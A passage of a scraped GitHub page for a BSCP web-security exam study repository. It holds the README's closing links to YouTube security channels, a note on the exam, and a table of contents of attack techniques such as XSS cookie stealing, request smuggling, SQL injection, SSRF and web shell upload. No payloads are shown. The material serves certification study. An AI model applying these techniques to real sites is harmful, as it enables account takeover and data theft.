1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSome great links to YouTube content creators training material and links to study stuff.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ca href=\"https://youtube.com/playlist?list=PLsDxQTEdg_YkVMP6PybE7I-hAdhR7adem\" rel=\"nofollow\"\u003eMy YouTube BSCP Study Playlist\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://youtu.be/uXDnS5PcjCA\" rel=\"nofollow\"\u003eUsing Burp and Postman, Brad Schiff explain Cookies, Sessions, JSON Web Tokens (JWT) - thanks!\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eYoutube Information Security content creators channels (\u003cem\u003e\u003cstrong\u003ein no particular order\u003c/strong\u003e\u003c/em\u003e):\u003c/p\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/@z3nsh3ll/videos\" rel=\"nofollow\"\u003ez3nsh3ll\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/@tjchacking/videos\" rel=\"nofollow\"\u003eTJCHacking\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/@intigriti/videos\" rel=\"nofollow\"\u003eintigriti\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/@7SeasSecurity/videos\" rel=\"nofollow\"\u003eSeven Seas Security\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/@RanaKhalil101/videos\" rel=\"nofollow\"\u003eRana Khalil\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/@Tib3rius/videos\" rel=\"nofollow\"\u003eTib3rius\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/@_JohnHammond/videos\" rel=\"nofollow\"\u003eJohn Hammond\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/@TraceTheCode/videos\" rel=\"nofollow\"\u003eTraceTheCode\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/@TCMSecurityAcademy/videos\" rel=\"nofollow\"\u003eThe Cyber Mentor\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/@h0tPlug1n/videos\" rel=\"nofollow\"\u003eSabyasachi Paul\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/@bmdyy/videos\" rel=\"nofollow\"\u003ebmdyy\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/@CyberSecurityTV/videos\" rel=\"nofollow\"\u003eCyberSecurityTV\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/@Nul1Secur1ty/videos\" rel=\"nofollow\"\u003enu11 security\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/@PortSwiggerTV/videos\" rel=\"nofollow\"\u003ePortSwigger\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/@ippsec/videos\" rel=\"nofollow\"\u003eIppSec\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/@danielredfern9827/videos\" rel=\"nofollow\"\u003eDaniel Redfern\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/@LiveUnderflow/videos\" rel=\"nofollow\"\u003eLiveUnderflow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/@JSONSEC/videos\" rel=\"nofollow\"\u003eJSONSEC\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/@thehackerish/videos\" rel=\"nofollow\"\u003ethehackerish\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/@davidbombal/videos\" rel=\"nofollow\"\u003eDavid Bombal\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/@LearnWebCode/videos\" rel=\"nofollow\"\u003eLearnWebCode Brad Schiff\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eFootnote\u003c/h2\u003e\u003ca id=\"user-content-footnote\" class=\"anchor\" aria-label=\"Permalink: Footnote\" href=\"#footnote\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003ePerseverance:\u003c/strong\u003e is Persistence in doing something despite difficulty or delay in achieving success.\u003cbr\u003e\nThe \u003cstrong\u003eOSCP\u003c/strong\u003e certification taught me to \u003ca href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main\"\u003e#TryHarder\u003c/a\u003e and gave me the foundation penetration testing skills.\u003cbr\u003e\nThe \u003cstrong\u003eBSCP\u003c/strong\u003e exam gave me the next level of web application security analyst knowledge.\u003cbr\u003e\nI hope my notes offer other Information Security Students some guidance and walkthrough tips.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eBurp Exam Results\u003c/h2\u003e\u003ca id=\"user-content-burp-exam-results\" class=\"anchor\" aria-label=\"Permalink: Burp Exam Results\" href=\"#burp-exam-results\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe Burp Suite Certified Practitioner exam is a challenging practical examination designed to demonstrate your web security testing knowledge and Burp Suite Professional skills.\u003cbr\u003e\nMy tip when preparing, is to understand the academy labs. Extra work is required as the labs do not always provide the identification of the vulnerability step.\u003cbr\u003e\nIn my study notes I document the lab guides from the official PortSwigger academy to make sure I know how to identify the vulnerability, use it in different scenarios and make payloads that show the impact when exploiting the vulnerability. As example crafting a XSS \u003ca href=\"https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md\"\u003ecookie stealer payload\u003c/a\u003e instead of just calling the \u003ccode\u003eprint\u003c/code\u003e function.\u003cbr\u003e\nThe BSCP qualification on my resume demonstrate a deep knowledge of the latest vulnerability classes and how to exploit Web Applications, proving my hacking ability to employers and the community.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/article\u003e","loaded":true,"timedOut":false,"errorMessage":null,"headerInfo":{"toc":[{"level":1,"text":"Burp Suite Certified Practitioner Exam Study","anchor":"burp-suite-certified-practitioner-exam-study","htmlText":"Burp Suite Certified Practitioner Exam Study"},{"level":1,"text":"Scanning","anchor":"scanning","htmlText":"Scanning"},{"level":2,"text":"Focus Scanning","anchor":"focus-scanning","htmlText":"Focus Scanning"},{"level":2,"text":"Scanning non-standard data structures","anchor":"scanning-non-standard-data-structures","htmlText":"Scanning non-standard data structures"},{"level":1,"text":"Foothold","anchor":"foothold","htmlText":"Foothold"},{"level":1,"text":"Content Discovery","anchor":"content-discovery","htmlText":"Content Discovery"},{"level":2,"text":"DOM-Based XSS","anchor":"dom-based-xss","htmlText":"DOM-Based XSS"},{"level":3,"text":"Identify DOM-XSS","anchor":"identify-dom-xss","htmlText":"Identify DOM-XSS"},{"level":3,"text":"Dom Invader","anchor":"dom-invader","htmlText":"Dom Invader"},{"level":3,"text":"Vulnerable AngularJS","anchor":"vulnerable-angularjs","htmlText":"Vulnerable AngularJS"},{"level":3,"text":"Doc Write Location search","anchor":"doc-write-location-search","htmlText":"Doc Write Location search"},{"level":3,"text":"DOM XSS JSON.parse web messages","anchor":"dom-xss-jsonparse-web-messages","htmlText":"DOM XSS JSON.parse web messages"},{"level":4,"text":"Requirements to steal cookie using this method: same-origin execution and non-HttpOnly cookies","anchor":"requirements-to-steal-cookie-using-this-method-same-origin-execution-and-non-httponly-cookies","htmlText":"Requirements to steal cookie using this method: same-origin execution and non-HttpOnly cookies"},{"level":3,"text":"DOM XSS AddEventListener JavaScript URL","anchor":"dom-xss-addeventlistener-javascript-url","htmlText":"DOM XSS AddEventListener JavaScript URL"},{"level":3,"text":"DOM XSS AddEventListener Ads Message","anchor":"dom-xss-addeventlistener-ads-message","htmlText":"DOM XSS AddEventListener Ads Message"},{"level":3,"text":"Reflected DOM XSS","anchor":"reflected-dom-xss","htmlText":"Reflected DOM XSS"},{"level":3,"text":"DOM-XSS LastviewedProduct Cookie","anchor":"dom-xss-lastviewedproduct-cookie","htmlText":"DOM-XSS LastviewedProduct Cookie"},{"level":2,"text":"Cross Site Scripting","anchor":"cross-site-scripting","htmlText":"Cross Site Scripting"},{"level":3,"text":"XSS Resources","anchor":"xss-resources","htmlText":"XSS Resources"},{"level":3,"text":"Identify allowed Tags","anchor":"identify-allowed-tags","htmlText":"Identify allowed Tags"},{"level":3,"text":"Bypass Blocked Tags","anchor":"bypass-blocked-tags","htmlText":"Bypass Blocked Tags"},{"level":3,"text":"XSS Assign protocol","anchor":"xss-assign-protocol","htmlText":"XSS Assign protocol"},{"level":3,"text":"Custom Tags not Blocked","anchor":"custom-tags-not-blocked","htmlText":"Custom Tags not Blocked"},{"level":3,"text":"OnHashChange","anchor":"onhashchange","htmlText":"OnHashChange"},{"level":3,"text":"Reflected String XSS","anchor":"reflected-string-xss","htmlText":"Reflected String XSS"},{"level":3,"text":"Reflected String Extra Escape","anchor":"reflected-string-extra-escape","htmlText":"Reflected String Extra Escape"},{"level":3,"text":"AngularJS Sandbox Escape","anchor":"angularjs-sandbox-escape","htmlText":"AngularJS Sandbox Escape"},{"level":3,"text":"XSS Template Literal","anchor":"xss-template-literal","htmlText":"XSS Template Literal"},{"level":4,"text":"Pivoting from above, his payload:","anchor":"pivoting-from-above-his-payload","htmlText":"Pivoting from above, his payload:"},{"level":3,"text":"XSS via JSON into EVAL","anchor":"xss-via-json-into-eval","htmlText":"XSS via JSON into EVAL"},{"level":3,"text":"Stored XSS","anchor":"stored-xss","htmlText":"Stored XSS"},{"level":4,"text":"Stored XSS Blog Post","anchor":"stored-xss-blog-post","htmlText":"Stored XSS Blog Post"},{"level":4,"text":"Upgrade stored self-XSS","anchor":"upgrade-stored-self-xss","htmlText":"Upgrade stored self-XSS"},{"level":3,"text":"Stored DOM XSS","anchor":"stored-dom-xss","htmlText":"Stored DOM XSS"},{"level":2,"text":"Web Cache Poison","anchor":"web-cache-poison","htmlText":"Web Cache Poison"},{"level":3,"text":"Unkeyed header","anchor":"unkeyed-header","htmlText":"Unkeyed header"},{"level":3,"text":"Unkeyed utm_content","anchor":"unkeyed-utm_content","htmlText":"Unkeyed utm_content"},{"level":3,"text":"Cloaking utm_content","anchor":"cloaking-utm_content","htmlText":"Cloaking utm_content"},{"level":3,"text":"Poison ambiguous request","anchor":"poison-ambiguous-request","htmlText":"Poison ambiguous request"},{"level":3,"text":"Cache Poison multiple headers","anchor":"cache-poison-multiple-headers","htmlText":"Cache Poison multiple headers"},{"level":3,"text":"Duplicate Parameter Fat Poison","anchor":"duplicate-parameter-fat-poison","htmlText":"Duplicate Parameter Fat Poison"},{"level":2,"text":"Host Headers","anchor":"host-headers","htmlText":"Host Headers"},{"level":3,"text":"Spoof IP Address","anchor":"spoof-ip-address","htmlText":"Spoof IP Address"},{"level":3,"text":"HOST Connection State","anchor":"host-connection-state","htmlText":"HOST Connection State"},{"level":2,"text":"HTTP Request Smuggling","anchor":"http-request-smuggling","htmlText":"HTTP Request Smuggling"},{"level":3,"text":"TE.CL dualchunk - Transfer-encoding obfuscated","anchor":"tecl-dualchunk---transfer-encoding-obfuscated","htmlText":"TE.CL dualchunk - Transfer-encoding obfuscated"},{"level":3,"text":"TE.CL multiCase - Admin blocked","anchor":"tecl-multicase---admin-blocked","htmlText":"TE.CL multiCase - Admin blocked"},{"level":3,"text":"CL.TE multiCase - Admin blocked","anchor":"clte-multicase---admin-blocked","htmlText":"CL.TE multiCase - Admin blocked"},{"level":3,"text":"CL.TE multiCase - Content-Length","anchor":"clte-multicase---content-length","htmlText":"CL.TE multiCase - Content-Length"},{"level":3,"text":"CL.TE multiCase - User-Agent Cookie Stealer","anchor":"clte-multicase---user-agent-cookie-stealer","htmlText":"CL.TE multiCase - User-Agent Cookie Stealer"},{"level":3,"text":"HTTP/2 smuggling via CRLF injection","anchor":"http2-smuggling-via-crlf-injection","htmlText":"HTTP/2 smuggling via CRLF injection"},{"level":3,"text":"HTTP/2 TE desync v10a h2path","anchor":"http2-te-desync-v10a-h2path","htmlText":"HTTP/2 TE desync v10a h2path"},{"level":2,"text":"Brute Force","anchor":"brute-force","htmlText":"Brute Force"},{"level":3,"text":"Stay-Logged-in","anchor":"stay-logged-in","htmlText":"Stay-Logged-in"},{"level":3,"text":"Stay-logged-in Offline Crack","anchor":"stay-logged-in-offline-crack","htmlText":"Stay-logged-in Offline Crack"},{"level":3,"text":"Brute Force Protected Login","anchor":"brute-force-protected-login","htmlText":"Brute Force Protected Login"},{"level":3,"text":"Subtly Invalid Login","anchor":"subtly-invalid-login","htmlText":"Subtly Invalid Login"},{"level":2,"text":"Authentication","anchor":"authentication","htmlText":"Authentication"},{"level":3,"text":"Account Registration","anchor":"account-registration","htmlText":"Account Registration"},{"level":3,"text":"Auth Token bypass Macro","anchor":"auth-token-bypass-macro","htmlText":"Auth Token bypass Macro"},{"level":1,"text":"Privilege Escalation","anchor":"privilege-escalation","htmlText":"Privilege Escalation"},{"level":2,"text":"CSRF Account Takeover","anchor":"csrf-account-takeover","htmlText":"CSRF Account Takeover"},{"level":3,"text":"OAuth","anchor":"oauth","htmlText":"OAuth"},{"level":3,"text":"Referer Validation CSRF","anchor":"referer-validation-csrf","htmlText":"Referer Validation CSRF"},{"level":3,"text":"Referer Header Present","anchor":"referer-header-present","htmlText":"Referer Header Present"},{"level":3,"text":"LastSearchTerm","anchor":"lastsearchterm","htmlText":"LastSearchTerm"},{"level":3,"text":"CSRF duplicated in cookie","anchor":"csrf-duplicated-in-cookie","htmlText":"CSRF duplicated in cookie"},{"level":3,"text":"CSRF Token Present","anchor":"csrf-token-present","htmlText":"CSRF Token Present"},{"level":3,"text":"Is Logged In","anchor":"is-logged-in","htmlText":"Is Logged In"},{"level":3,"text":"CSRF No Defences","anchor":"csrf-no-defences","htmlText":"CSRF No Defences"},{"level":3,"text":"SameSite Strict bypass","anchor":"samesite-strict-bypass","htmlText":"SameSite Strict bypass"},{"level":3,"text":"SameSite Lax bypass","anchor":"samesite-lax-bypass","htmlText":"SameSite Lax bypass"},{"level":2,"text":"Password Reset","anchor":"password-reset","htmlText":"Password Reset"},{"level":3,"text":"Refresh Password broken logic","anchor":"refresh-password-broken-logic","htmlText":"Refresh Password broken logic"},{"level":3,"text":"Current Password","anchor":"current-password","htmlText":"Current Password"},{"level":3,"text":"Time-Sensitive Password Tokenz","anchor":"time-sensitive-password-tokenz","htmlText":"Time-Sensitive Password Tokenz"},{"level":2,"text":"SQL Injection","anchor":"sql-injection","htmlText":"SQL Injection"},{"level":3,"text":"Blind Time Delay","anchor":"blind-time-delay","htmlText":"Blind Time Delay"},{"level":4,"text":"Practice Exam PostgreSQL TimeDelay","anchor":"practice-exam-postgresql-timedelay","htmlText":"Practice Exam PostgreSQL TimeDelay"},{"level":3,"text":"Blind SQLi","anchor":"blind-sqli","htmlText":"Blind SQLi"},{"level":3,"text":"Blind SQLi no indication","anchor":"blind-sqli-no-indication","htmlText":"Blind SQLi no indication"},{"level":3,"text":"Blind SQLi Conditional Response","anchor":"blind-sqli-conditional-response","htmlText":"Blind SQLi Conditional Response"},{"level":3,"text":"Oracle","anchor":"oracle","htmlText":"Oracle"},{"level":3,"text":"SQLMAP","anchor":"sqlmap","htmlText":"SQLMAP"},{"level":3,"text":"Non-Oracle Manual SQLi","anchor":"non-oracle-manual-sqli","htmlText":"Non-Oracle Manual SQLi"},{"level":3,"text":"Visual error-based SQLi","anchor":"visual-error-based-sqli","htmlText":"Visual error-based SQLi"},{"level":2,"text":"JWT","anchor":"jwt","htmlText":"JWT"},{"level":3,"text":"JWT bypass via JWK","anchor":"jwt-bypass-via-jwk","htmlText":"JWT bypass via JWK"},{"level":3,"text":"JWT Weak secret","anchor":"jwt-weak-secret","htmlText":"JWT Weak secret"},{"level":3,"text":"JWT kid header","anchor":"jwt-kid-header","htmlText":"JWT kid header"},{"level":3,"text":"JWT arbitrary jku header","anchor":"jwt-arbitrary-jku-header","htmlText":"JWT arbitrary jku header"},{"level":2,"text":"ProtoType Pollution","anchor":"prototype-pollution","htmlText":"ProtoType Pollution"},{"level":3,"text":"Client-Side Proto","anchor":"client-side-proto","htmlText":"Client-Side Proto"},{"level":3,"text":"Server-Side Proto","anchor":"server-side-proto","htmlText":"Server-Side Proto"},{"level":2,"text":"API Testing","anchor":"api-testing","htmlText":"API Testing"},{"level":3,"text":"Exploiting a mass assignment","anchor":"exploiting-a-mass-assignment","htmlText":"Exploiting a mass assignment"},{"level":3,"text":"API Reset Password Parameter Pollution","anchor":"api-reset-password-parameter-pollution","htmlText":"API Reset Password Parameter Pollution"},{"level":4,"text":"URL Encode Character Table","anchor":"url-encode-character-table","htmlText":"URL Encode Character Table"},{"level":2,"text":"Access Control","anchor":"access-control","htmlText":"Access Control"},{"level":3,"text":"PrivEsc JSON RoleId","anchor":"privesc-json-roleid","htmlText":"PrivEsc JSON RoleId"},{"level":3,"text":"Drop Select a role","anchor":"drop-select-a-role","htmlText":"Drop Select a role"},{"level":3,"text":"Original URL","anchor":"original-url","htmlText":"Original URL"},{"level":3,"text":"Trace to Admin","anchor":"trace-to-admin","htmlText":"Trace to Admin"},{"level":2,"text":"GraphQL API","anchor":"graphql-api","htmlText":"GraphQL API"},{"level":3,"text":"Identify GraphQL API","anchor":"identify-graphql-api","htmlText":"Identify GraphQL API"},{"level":3,"text":"GraphQL Reveal Creds","anchor":"graphql-reveal-creds","htmlText":"GraphQL Reveal Creds"},{"level":3,"text":"GraphQL Brute Force","anchor":"graphql-brute-force","htmlText":"GraphQL Brute Force"},{"level":3,"text":"GraphQL Voyager","anchor":"graphql-voyager","htmlText":"GraphQL Voyager"},{"level":2,"text":"CORS","anchor":"cors","htmlText":"CORS"},{"level":3,"text":"Trusted insecure protocols","anchor":"trusted-insecure-protocols","htmlText":"Trusted insecure protocols"},{"level":3,"text":"Null origin trusted","anchor":"null-origin-trusted","htmlText":"Null origin trusted"},{"level":1,"text":"Data Exfiltration","anchor":"data-exfiltration","htmlText":"Data Exfiltration"},{"level":2,"text":"XXE Injections","anchor":"xxe-injections","htmlText":"XXE Injections"},{"level":3,"text":"Identify XML","anchor":"identify-xml","htmlText":"Identify XML"},{"level":3,"text":"Xinclude file read","anchor":"xinclude-file-read","htmlText":"Xinclude file read"},{"level":3,"text":"DTD Blind Out-of-band","anchor":"dtd-blind-out-of-band","htmlText":"DTD Blind Out-of-band"},{"level":3,"text":"Identify Existing DTD Files","anchor":"identify-existing-dtd-files","htmlText":"Identify Existing DTD Files"},{"level":3,"text":"DTD Blind Error messages","anchor":"dtd-blind-error-messages","htmlText":"DTD Blind Error messages"},{"level":3,"text":"SQL + XML + HackVertor","anchor":"sql--xml--hackvertor","htmlText":"SQL + XML + HackVertor"},{"level":2,"text":"SSRF - Server Side Request Forgery","anchor":"ssrf---server-side-request-forgery","htmlText":"SSRF - Server Side Request Forgery"},{"level":3,"text":"SSRF blacklist filter","anchor":"ssrf-blacklist-filter","htmlText":"SSRF blacklist filter"},{"level":3,"text":"Absolute GET URL + HOST SSRF","anchor":"absolute-get-url--host-ssrf","htmlText":"Absolute GET URL + HOST SSRF"},{"level":3,"text":"SSRF redirect_uris","anchor":"ssrf-redirect_uris","htmlText":"SSRF redirect_uris"},{"level":3,"text":"XXE + SSRF","anchor":"xxe--ssrf","htmlText":"XXE + SSRF"},{"level":3,"text":"HOST Routing-based SSRF","anchor":"host-routing-based-ssrf","htmlText":"HOST Routing-based SSRF"},{"level":3,"text":"HTML to PDF","anchor":"html-to-pdf","htmlText":"HTML to PDF"},{"level":3,"text":"SSRF Open Redirection","anchor":"ssrf-open-redirection","htmlText":"SSRF Open Redirection"},{"level":2,"text":"SSTI - Server Side Template Injection","anchor":"ssti---server-side-template-injection","htmlText":"SSTI - Server Side Template Injection"},{"level":3,"text":"SSTI Identified","anchor":"ssti-identified","htmlText":"SSTI Identified"},{"level":3,"text":"Tornado","anchor":"tornado","htmlText":"Tornado"},{"level":3,"text":"Django","anchor":"django","htmlText":"Django"},{"level":3,"text":"Freemarker","anchor":"freemarker","htmlText":"Freemarker"},{"level":3,"text":"ERB","anchor":"erb","htmlText":"ERB"},{"level":3,"text":"Handlebars","anchor":"handlebars","htmlText":"Handlebars"},{"level":2,"text":"SSPP - Server Side Prototype Pollution","anchor":"sspp---server-side-prototype-pollution","htmlText":"SSPP - Server Side Prototype Pollution"},{"level":2,"text":"File Path Traversal","anchor":"file-path-traversal","htmlText":"File Path Traversal"},{"level":3,"text":"LFI attacks","anchor":"lfi-attacks","htmlText":"LFI attacks"},{"level":3,"text":"Admin Portal Files","anchor":"admin-portal-files","htmlText":"Admin Portal Files"},{"level":3,"text":"Path Traversal Authz","anchor":"path-traversal-authz","htmlText":"Path Traversal Authz"},{"level":2,"text":"File Uploads","anchor":"file-uploads","htmlText":"File Uploads"},{"level":3,"text":"Bypass Upload Controls","anchor":"bypass-upload-controls","htmlText":"Bypass Upload Controls"},{"level":3,"text":"XXE via SVG Image upload","anchor":"xxe-via-svg-image-upload","htmlText":"XXE via SVG Image upload"},{"level":3,"text":"Remote File Inclusion","anchor":"remote-file-inclusion","htmlText":"Remote File Inclusion"},{"level":3,"text":"XSS SVG Upload","anchor":"xss-svg-upload","htmlText":"XSS SVG Upload"},{"level":3,"text":"Race Condition Web shell upload","anchor":"race-condition-web-shell-upload","htmlText":"Race Condition Web shell upload"},{"level":3,"text":"WebShell JSP File Upload","anchor":"webshell-jsp-file-upload","htmlText":"WebShell JSP File Upload"},{"level":2,"text":"Deserialization","anchor":"deserialization","htmlText":"Deserialization"},{"level":3,"text":"CustomTemplate PHP","anchor":"customtemplate-php","htmlText":"CustomTemplate PHP"},{"level":3,"text":"Burp Deserialization Scanner","anchor":"burp-deserialization-scanner","htmlText":"Burp Deserialization Scanner"},{"level":3,"text":"YsoSerial","anchor":"ysoserial","htmlText":"YsoSerial"},{"level":3,"text":"SHA1 HMAC Symfony","anchor":"sha1-hmac-symfony","htmlText":"SHA1 HMAC Symfony"},{"level":2,"text":"OS Command Injection","anchor":"os-command-injection","htmlText":"OS Command Injection"},{"level":3,"text":"Feedback","anchor":"feedback","htmlText":"Feedback"},{"level":3,"text":"Output redirection","anchor":"output-redirection","htmlText":"Output redirection"},{"level":1,"text":"Appendix","anchor":"appendix","htmlText":"Appendix"},{"level":2,"text":"Obfuscation","anchor":"obfuscation","htmlText":"Obfuscation"},{"level":2,"text":"Python Scripts","anchor":"python-scripts","htmlText":"Python Scripts"},{"level":2,"text":"Approach","anchor":"approach","htmlText":"Approach"},{"level":3,"text":"Identified","anchor":"identified","htmlText":"Identified"},{"level":2,"text":"Extra Training Content","anchor":"extra-training-content","htmlText":"Extra Training Content"},{"level":2,"text":"Footnote","anchor":"footnote","htmlText":"Footnote"},{"level":2,"text":"Burp Exam Results","anchor":"burp-exam-results","htmlText":"Burp Exam Results"}],"siteNavLoginPath":"/login?return_to=https%3A%2F%2Fgithub.com%2Fbotesjuan%2FBurp-Suite-Certified-Practitioner-Exam-Study%3Futm_source%3Dchatgpt.com"}}],"overviewFilesProcessingTime":0,"copilotSWEAgentEnabled":false}},"appPayload":{"helpUrl":"https://docs.github.com","findFileWorkerPath":"/assets-cdn/worker/find-file-worker-0cea8c6113ab.js","findInFileWorkerPath":"/assets-cdn/worker/find-in-file-worker-105a4a160ddd.js","githubDevUrl":null,"enabled_features":{"copilot_workspace":null,"code_nav_ui_events":false,"react_blob_overlay":false,"accessible_code_button":true}}}}</script>
  <div data-target="react-partial.reactRoot"> <!-- --> <!-- --> <div class="OverviewContent-module__Box--uNd1J"><div class="OverviewHeader-module__Box--fFKf5"></div><div class="OverviewContent-module__Box_1--RhaEy"><div class="OverviewContent-module__Box_2--uHewD"><div class="OverviewContent-module__Box_3--NEYWl"><button type="button" aria-haspopup="true" aria-expanded="false" tabindex="0" style="min-width:0" aria-label="main branch" data-testid="anchor-button" class="prc-Button-ButtonBase-c50BI overview-ref-selector width-full RefSelectorAnchoredOverlay-module__RefSelectorOverlayBtn--D34zl" data-loading="false" data-size="medium" data-variant="default" aria-describedby="ref-picker-repos-header-ref-selector-loading-announcement" id="ref-picker-repos-header-ref-selector"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-HKbr-"><span data-component="text" class="prc-Button-Label-pTQ3x"><div class="RefSelectorAnchoredOverlay-module__RefSelectorOverlayContainer--mCbv8"><div class="RefSelectorAnchoredOverlay-module__RefSelectorOverlayHeader--D4cnZ"><svg aria-hidden="true" focusable="false" class="octicon octicon-git-branch" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M9.5 3.25a2.25 2.25 0 1 1 3 2.122V6A2.5 2.5 0 0 1 10 8.5H6a1 1 0 0 0-1 1v1.128a2.251 2.251 0 1 1-1.5 0V5.372a2.25 2.25 0 1 1 1.5 0v1.836A2.493 2.493 0 0 1 6 7h4a1 1 0 0 0 1-1v-.628A2.25 2.25 0 0 1 9.5 3.25Zm-6 0a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Zm8.25-.75a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5ZM4.25 12a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Z"></path></svg></div><div class="ref-selector-button-text-container RefSelectorAnchoredOverlay-module__RefSelectorBtnTextContainer--yO402"><span class="RefSelectorAnchoredOverlay-module__RefSelectorText--bxVhQ"><!-- -->main</span></div></div></span><span data-component="trailingVisual" class="prc-Button-Visual-2epfX prc-Button-VisualWrap-Db-eB"><svg aria-hidden="true" focusable="false" class="octicon octicon-triangle-down" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path></svg></span></span></button><button hidden="" data-testid="ref-selector-hotkey-button" 